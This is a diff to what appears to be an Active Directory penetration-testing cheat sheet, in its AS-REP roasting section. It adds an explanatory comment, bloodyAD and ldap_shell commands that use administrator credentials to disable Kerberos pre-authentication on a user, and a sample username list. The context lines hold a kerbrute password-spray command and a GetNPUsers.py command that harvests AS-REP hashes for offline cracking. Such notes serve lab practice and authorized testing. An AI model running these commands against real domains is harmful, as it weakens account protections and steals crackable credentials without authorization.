@@ -56,13 +56,22 @@ kerbrute passwordspray -d corp.local --dc 192.168.1.10 valid_users.txt 'Winter20
 
 
 # AS-REP roasting
+#Attackers can exploit user accounts with Kerberos pre-authentication disabled by requesting encrypted credentials (AS-REP responses) and cracking them offline.
+
 #disable pre authentication mechanism we you have domain credentials to make it vulnerable. 
+
 bloodyAD --host 192.168.1.48 -d ignite.local -u administrator -p Ignite@987 add uac yashika -f DONT_REQ_PREAUTH
 
 ldap_shell ignite.local/administrator:Ignite@987 -dc-ip 192.168.1.48
 set_dontreqpreauth yashika true
 set_dontreqpreauth yashika false
 
+#in valid user
+jdoe
+asmith
+svc_backup
+admin@corp.local
+corp.local\svc_sql
 
 
 GetNPUsers.py corp.local/ -usersfile valid_users.txt -dc-ip 192.168.1.10 -outputfile asreproast_hashes.txt
